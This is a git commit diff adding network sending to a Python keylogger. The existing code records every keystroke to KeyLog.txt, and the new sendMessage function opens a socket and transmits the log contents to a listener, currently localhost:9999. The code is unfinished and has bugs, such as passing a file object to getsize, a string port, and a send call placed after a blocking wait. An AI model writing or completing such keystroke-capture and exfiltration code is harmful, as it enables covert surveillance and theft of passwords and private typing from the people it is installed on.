f34275807870c2c3d7be837f7745a59f148e7911
Jamie <bartonjamie109@gmail.com>
2024-04-03 13:50:04 -0700

    Some work done on the sending fucntionality, more coming later today

--- app.py
+++ app.py
@@ -1,6 +1,6 @@
 import keyboard
-
-
+import socket
+import os
 
 def keyPress(event):
 
@@ -9,16 +9,36 @@ def keyPress(event):
             f.write('\n----------\n (Return) \n----------\n')
         else:
             f.write('{}'.format(event.name))
-        # f.write('{}\n'.format(event.name))
+
+
+def sendMessage(s, log):
+
+    file = open(log, 'rb')
+    #For getting file size, may not be used.
+    file_size = os.path.getsize(file)
+
+    s.send("recieved_log".encode())
+    #More file size stuff
+    s.send(str(file_size).encode())
+
+    data = file.read()
+    s.sendall(data)
+    s.send(b"<END>")
+    
 
 
 def main():
 
-    # logFile = createFile()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("localhost",'9999'))
+
 
     log = open("KeyLog.txt", 'w')
     keyboard.on_press(keyPress)
     keyboard.wait()
+
+    #Send log file every day?  Needs function for that
+    sendMessage(s, log)
 
 if __name__ == "__main__":
     main()
